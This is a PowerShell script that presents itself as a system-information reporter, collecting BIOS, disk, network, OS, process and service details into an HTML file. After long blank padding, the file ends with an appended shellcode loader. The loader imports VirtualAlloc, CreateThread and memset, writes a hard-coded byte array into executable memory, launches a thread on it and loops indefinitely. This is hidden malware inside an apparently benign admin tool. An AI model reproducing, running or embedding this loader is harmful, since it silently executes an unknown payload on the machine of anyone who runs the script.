
 
 
 
 
 
 
 
 
                                                               | :   |
 
 
 
                                                                           | :   |                                                  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 $ a   =   " < s t y l e > " 
 
 $ a   =   $ a   +   " B O D Y { b a c k g r o u n d - c o l o r : L a v e n d e r   ; } " 
 
 $ a   =   $ a   +   " T A B L E { b o r d e r - w i d t h :   1 p x ; b o r d e r - s t y l e :   s o l i d ; b o r d e r - c o l o r :   b l a c k ; b o r d e r - c o l l a p s e :   c o l l a p s e ; } " 
 
 $ a   =   $ a   +   " T H { b o r d e r - w i d t h :   1 p x ; p a d d i n g :   0 p x ; b o r d e r - s t y l e :   s o l i d ; b o r d e r - c o l o r :   b l a c k ; b a c k g r o u n d - c o l o r : t h i s t l e } " 
 
 $ a   =   $ a   +   " T D { b o r d e r - w i d t h :   1 p x ; p a d d i n g :   0 p x ; b o r d e r - s t y l e :   s o l i d ; b o r d e r - c o l o r :   b l a c k ; b a c k g r o u n d - c o l o r : P a l e G o l d e n r o d } " 
 
 $ a   =   $ a   +   " < / s t y l e > " 
 
 
 
 
 
 
 
 
 
 
 
 $ v U s e r N a m e   =   ( G e t - I t e m   e n v : \ u s e r n a m e ) . V a l u e   	 	 	 
 
 $ v C o m p u t e r N a m e   =   ( G e t - I t e m   e n v : \ C o m p u t e r n a m e ) . V a l u e           
 
 $ f i l e p a t h   =   ( G e t - C h i l d I t e m   e n v : \ u s e r p r o f i l e ) . v a l u e 	 	 
 
 
 
 
 
 
 
 C o n v e r t T o - H t m l   - T i t l e   " S y s t e m   I n f o r m a t i o n   f o r   $ v C o m p u t e r N a m e "   - B o d y   " < h 1 >   C o m p u t e r   N a m e   :   $ v C o m p u t e r N a m e   < / h 1 > "   >     " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l "   
 
 
 
 
 
 
 
 
 
 
 
 C o n v e r t T o - H t m l   - B o d y   " < H 1 > H A R D W A R E   I N F O R M A T I O N   < / H 1 > "   > >   " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l " 
 
 
 
 
 
 G e t - W m i O b j e c t   w i n 3 2 _ b i o s   - C o m p u t e r N a m e   $ v C o m p u t e r N a m e   |   s e l e c t   S t a t u s , V e r s i o n , P r i m a r y B I O S , M a n u f a c t u r e r , R e l e a s e D a t e , S e r i a l N u m b e r   ` 
 
                                                                                     |   C o n v e r t T o - h t m l   - B o d y   " < H 2 >   B I O S   I n f o r m a t i o n < / H 2 > "   > >     " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l " 
 
 	 	 	 	 	 	 	 	 	 	     
 
 G e t - W m i O b j e c t   w i n 3 2 _ D i s k D r i v e   - C o m p u t e r N a m e   $ v C o m p u t e r N a m e   |   S e l e c t   M o d e l , S e r i a l N u m b e r , D e s c r i p t i o n , M e d i a T y p e , F i r m w a r e R e v i s i o n   | C o n v e r t T o - h t m l   - B o d y   " < H 2 >   P h y s i c a l   D I S K   D r i v e s   < / H 2 > "   > >     " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l " 
 
 
 
 g e t - W m i O b j e c t   w i n 3 2 _ n e t w o r k a d a p t e r   - C o m p u t e r N a m e   $ v C o m p u t e r N a m e   |   S e l e c t   N a m e , M a n u f a c t u r e r , D e s c r i p t i o n   , A d a p t e r T y p e , S p e e d , M A C A d d r e s s , N e t C o n n e c t i o n I D   ` 
 
                                                                                     |   C o n v e r t T o - h t m l   - B o d y   " < H 2 >   N e t w o r k   A d a p t e r s < / H 2 > "   > >     " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l " 
 
 	 	 	 	 	 	 	 	 	 	     
 
 
 
 
 
 
 
 
 
 
 
 C o n v e r t T o - H t m l   - B o d y   " < H 1 > O S   I N F O R M A T I O N   < / H 1 > "   > >   " $ f i l e p a t h \ $ n a m e . h t m l "   
 
 
 
 g e t - W m i O b j e c t   w i n 3 2 _ o p e r a t i n g s y s t e m   - C o m p u t e r N a m e   $ v C o m p u t e r N a m e   |   s e l e c t   C a p t i o n , O r g a n i z a t i o n , I n s t a l l D a t e , O S A r c h i t e c t u r e , V e r s i o n , S e r i a l N u m b e r , B o o t D e v i c e , W i n d o w s D i r e c t o r y , C o u n t r y C o d e   ` 
 
                                                                                     |   C o n v e r t T o - h t m l   - B o d y   " < H 2 >   O p e r a t i n g   S y s t e m   I n f o r m a t i o n < / H 2 > "   > >     " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l " 
 
 	 	 	 	 	 	 	 	 	 	     
 
 G e t - W m i O b j e c t   w i n 3 2 _ l o g i c a l D i s k   - C o m p u t e r N a m e   $ v C o m p u t e r N a m e   |   s e l e c t   D e v i c e I D , V o l u m e N a m e , @ { E x p r e s s i o n = { $ _ . S i z e   / 1 G b   - a s   [ i n t ] } ; L a b e l = " T o t a l   S i z e ( G B ) " } , @ { E x p r e s s i o n = { $ _ . F r e e s p a c e   /   1 G b   - a s   [ i n t ] } ; L a b e l = " F r e e   S i z e   ( G B ) " }   ` 
 
                                                                                   |   C o n v e r t T o - h t m l   - B o d y   " < H 2 >   L o g i c a l   D I S K   D r i v e s   < / H 2 > "   > >     " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l " 
 
 	 	 	 	 	 	 	 	 	 	   
 
 G e t - W m i O b j e c t   W i n 3 2 _ N e t w o r k A d a p t e r C o n f i g u r a t i o n   - C o m p u t e r N a m e   $ v C o m p u t e r N a m e   | 
 
         S e l e c t - O b j e c t   D e s c r i p t i o n ,   D H C P S e r v e r ,   
 
                 @ { N a m e = ' I p A d d r e s s ' ; E x p r e s s i o n = { $ _ . I p A d d r e s s   - j o i n   ' ;   ' } } ,   
 
                 @ { N a m e = ' I p S u b n e t ' ; E x p r e s s i o n = { $ _ . I p S u b n e t   - j o i n   ' ;   ' } } ,   
 
                 @ { N a m e = ' D e f a u l t I P g a t e w a y ' ; E x p r e s s i o n = { $ _ . D e f a u l t I P g a t e w a y   - j o i n   ' ;   ' } } ,   
 
                 @ { N a m e = ' D N S S e r v e r S e a r c h O r d e r ' ; E x p r e s s i o n = { $ _ . D N S S e r v e r S e a r c h O r d e r   - j o i n   ' ;   ' } } ,   
 
                 W i n s P r i m a r y S e r v e r ,   W I N S S e c o n d a r y S e r v e r |   C o n v e r t T o - h t m l   - B o d y   " < H 2 > I P   A d d r e s s   < / H 2 > "   > >     " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l "   	 	 	 	 	 	 	 	 	 	   
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 C o n v e r t T o - H t m l   - B o d y   " < H 1 > S O F T W A R E   I N F O R M A T I O N   < / H 1 > "   > >   " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l " 
 
 
 
 G e t - W m i O b j e c t   w i n 3 2 _ s t a r t u p C o m m a n d   - C o m p u t e r N a m e   $ v C o m p u t e r N a m e   |   s e l e c t   N a m e , L o c a t i o n , C o m m a n d , U s e r , c a p t i o n   ` 
 
                                                                                     |   C o n v e r t T o - h t m l     - B o d y   " < H 2 > S t a r t u p   S o f t w a r e s < / H 2 > "   > >     " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l " 
 
 G e t - W m i O b j e c t   w i n 3 2 _ p r o c e s s   - C o m p u t e r N a m e   $ v C o m p u t e r N a m e   |   s e l e c t   C a p t i o n , P r o c e s s I d , @ { E x p r e s s i o n = { $ _ . V m   / 1 m b   - a s   [ I n t ] } ; L a b e l = " V M   ( M B ) " } , @ { E x p r e s s i o n = { $ _ . W s   / 1 M b   - a s   [ I n t ] } ; L a b e l = " W S   ( M B ) " }   | s o r t   " V m   ( M B ) "   - D e s c e n d i n g   ` 
 
                                                                                   |   C o n v e r t T o - h t m l     - H e a d   $ a   - B o d y   " < H 2 >   R u n n i n g   P r o c e s s e s < / H 2 > "   > >     " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l " 
 
 	 	 	 	 	 	 	 	 	 	   
 
 
 
 G e t - W m i O b j e c t   w i n 3 2 _ S e r v i c e     |   w h e r e   { $ _ . S t a r t M o d e   - e q   " A u t o "   - a n d   $ _ . S t a t e   - e q   " s t o p p e d " }   |     S e l e c t   N a m e , S t a r t M o d e , S t a t e   |   C o n v e r t T o - h t m l     - H e a d   $ a   - B o d y   " < H 2 >   S e r v i c e s   < / H 2 > "   > >     " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l " 	 	 	 	 	 	 	 	 	 	   
 
 	 	 	 	 	 	 	 	 	 	   
 
 $ R e p o r t   =   " T h e   R e p o r t   i s   g e n e r a t e d   O n     $ ( g e t - d a t e )   b y   $ ( ( G e t - I t e m   e n v : \ u s e r n a m e ) . V a l u e )   o n   c o m p u t e r   $ ( ( G e t - I t e m   e n v : \ C o m p u t e r n a m e ) . V a l u e ) " 
 
 $ R e p o r t     > >   " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l "   
 
 
 
 
 
 i n v o k e - E x p r e s s i o n   " $ f i l e p a t h \ $ v C o m p u t e r N a m e . h t m l "     
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x18,0xbd,0x42,0x63,0xda,0xcc,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x4b,0x31,0x42,0x15,0x83,0xc2,0x04,0x03,0x42,0x11,0xe2,0xed,0x41,0xaa,0xe1,0x0d,0xba,0x2b,0x86,0x84,0x5f,0x1a,0x86,0xf2,0x14,0x0d,0x36,0x71,0x78,0xa2,0xbd,0xd7,0x69,0x31,0xb3,0xff,0x9e,0xf2,0x7e,0xd9,0x91,0x03,0xd2,0x19,0xb3,0x87,0x29,0x4d,0x13,0xb9,0xe1,0x80,0x52,0xfe,0x1c,0x68,0x06,0x57,0x6a,0xde,0xb7,0xdc,0x26,0xe2,0x3c,0xae,0xa7,0x62,0xa0,0x67,0xc9,0x43,0x77,0xf3,0x90,0x43,0x79,0xd0,0xa8,0xca,0x61,0x35,0x94,0x85,0x1a,0x8d,0x62,0x14,0xcb,0xdf,0x8b,0xba,0x32,0xd0,0x79,0xc3,0x73,0xd7,0x61,0xb6,0x8d,0x2b,0x1f,0xc0,0x49,0x51,0xfb,0x45,0x4a,0xf1,0x88,0xfd,0xb6,0x03,0x5c,0x9b,0x3d,0x0f,0x29,0xe8,0x1a,0x0c,0xac,0x3d,0x11,0x28,0x25,0xc0,0xf6,0xb8,0x7d,0xe6,0xd2,0xe1,0x26,0x87,0x43,0x4c,0x88,0xb8,0x94,0x2f,0x75,0x1c,0xde,0xc2,0x62,0x2d,0xbd,0x8a,0x47,0x1f,0x3e,0x4b,0xc0,0x28,0x4d,0x79,0x4f,0x82,0xd9,0x31,0x18,0x0c,0x1d,0x35,0x33,0xe8,0xb1,0xc8,0xbc,0x08,0x9b,0x0e,0xe8,0x58,0xb3,0xa7,0x91,0x33,0x43,0x47,0x44,0x93,0x13,0xe7,0x37,0x53,0xc4,0x47,0xe8,0x3b,0x0e,0x48,0xd7,0x5b,0x31,0x82,0x70,0xf1,0xcb,0x45,0xbf,0xad,0xd5,0xf0,0x57,0xaf,0xd5,0xeb,0xfb,0x26,0x33,0x61,0x14,0x6e,0xeb,0x1e,0x8d,0x2b,0x67,0xbe,0x52,0xe6,0x0d,0x80,0xd9,0x02,0xf1,0x4f,0x2a,0x67,0xe1,0xb8,0x15,0x87,0xf9,0x38,0x00,0x87,0x93,0x3c,0x82,0xd0,0x0b,0x3f,0xf3,0x16,0x94,0xc0,0xd6,0x25,0xd3,0x3f,0xa7,0xc0,0xaf,0x76,0x3d,0x52,0xd8,0x76,0xd1,0x52,0x18,0x21,0xbb,0x52,0x70,0x95,0x9f,0x01,0x65,0xda,0x35,0x36,0x36,0x4f,0xb6,0x6e,0xea,0xd8,0xde,0x8c,0xd5,0x2f,0x41,0x6f,0x30,0x2c,0x86,0x8f,0xc5,0xf0,0x76,0x4c,0x10,0x31,0x0d,0xbb,0xa0,0x06,0x1e,0x8e,0x85,0x2f,0xb5,0xf0,0x9a,0x30,0x9c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

